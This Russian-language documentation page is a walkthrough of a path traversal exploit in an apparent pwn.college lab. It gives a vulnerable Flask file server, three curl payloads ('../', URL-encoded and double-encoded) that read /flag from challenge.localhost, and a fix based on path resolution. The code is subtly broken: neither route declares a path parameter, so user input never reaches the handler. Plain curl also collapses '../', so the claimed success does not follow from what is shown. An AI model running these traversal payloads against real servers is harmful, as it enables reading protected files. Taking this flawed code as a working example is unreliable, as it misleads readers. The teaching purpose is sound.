---
title: Веб-безопасность
nav_order: 1
parent: Русский
---
# Веб-безопасность
Заметки по веб-безопасности.

Пошаговое руководство по эксплуатации уязвимости Path Traversal

Введение
Path Traversal — это уязвимость веб-приложений, позволяющая злоумышленнику получать доступ к файлам за пределами разрешённой директории. В примере рассматривается сервер на Flask, который отдаёт файлы из папки /challenge/files. Ошибка заключается в том, что путь формируется напрямую из пользовательского ввода.

Код сервера:

Code

```
#!/opt/pwn.college/python
import flask
import os

app = flask.Flask(__name__)

@app.route("/files", methods=["GET"])
@app.route("/files/", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
Эксплуатация:

Так как сервер просто добавляет введённый путь к базовой директории, можно использовать последовательности ../ для выхода за её пределы.

Шаг 1. Простейший обход:

Code
curl -v 'http://challenge.localhost/files/../../../flag'
Шаг 2. URL-кодирование:

Code
curl -v 'http://challenge.localhost/files/%2e%2e/%2e%2e/%2e%2e/flag'
Шаг 3. Двойное кодирование:

Code
curl -v 'http://challenge.localhost/files/%252e%252e/%252e%252e/%252e%252e/flag'
В результате сервер возвращает содержимое файла.

Защита
Чтобы устранить уязвимость, необходимо нормализовать путь и убедиться, что он остаётся внутри разрешённой директории.


Code
```
from pathlib import Path

BASE_DIR = Path(app.root_path) / "files"

@app.route("/files", methods=["GET"])
@app.route("/files/", methods=["GET"])
def challenge(path="index.html"):
    requested_path = (BASE_DIR / path).resolve()
    if not requested_path.is_relative_to(BASE_DIR):
        flask.abort(403, "Access denied")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, "Permission denied")
    except FileNotFoundError:
        flask.abort(404, f"File not found: {requested_path}")
    except Exception as e:
        flask.abort(500, str(e))
```
Заключение
Path Traversal — опасная, но легко предотвращаемая уязвимость. Достаточно правильно обрабатывать пользовательский ввод и проверять пути, чтобы защитить приложение.
